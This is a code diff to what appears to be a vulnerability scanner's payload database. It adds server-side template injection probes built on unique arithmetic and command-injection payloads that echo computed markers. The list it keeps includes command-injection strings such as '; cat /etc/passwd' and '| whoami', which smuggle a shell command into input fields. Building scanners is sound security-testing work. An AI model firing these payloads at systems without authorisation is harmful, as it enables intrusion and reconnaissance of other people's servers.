@@ -218,7 +218,12 @@ class PayloadDB:
 
     # SSTI (Server-Side Template Injection) Payloads
     SSTI_PAYLOADS = [
-        # Detection payloads (math evaluation)
+        # Unique expressions (strongest - result never appears naturally)
+        '{{49163*49163}}',      # = 2417001769 (Jinja2, Twig)
+        '${49163*49163}',       # FreeMarker, Spring
+        '<%= 49163*49163 %>',   # ERB (Ruby)
+        '#{49163*49163}',       # EL
+        # Classic detection payloads (require baseline verification)
         '{{7*7}}',              # Jinja2, Twig
         '${7*7}',               # Velocity, FreeMarker, Spring
         '<%= 7*7 %>',           # ERB (Ruby)
@@ -313,6 +318,12 @@ class PayloadDB:
 
     # Command injection payloads
     RCE_PAYLOADS = [
+        # Echo markers first (causal proof - unique computed values)
+        '; echo XRCE$(expr 31337 + 7919)XRCE',
+        '| echo XRCE$(expr 31337 + 7919)XRCE',
+        '`echo XRCE$(expr 31337 + 7919)XRCE`',
+        '$(echo XRCE$(expr 31337 + 7919)XRCE)',
+        # Classic command output detection
         '; id',
         '| id',
         '|| id',
@@ -322,8 +333,6 @@ class PayloadDB:
         '| whoami',
         '; cat /etc/passwd',
         '| cat /etc/passwd',
-        '; ping -c 1 127.0.0.1',
-        '| ping -c 1 127.0.0.1',
         # Windows
         '& whoami',
         '| dir',
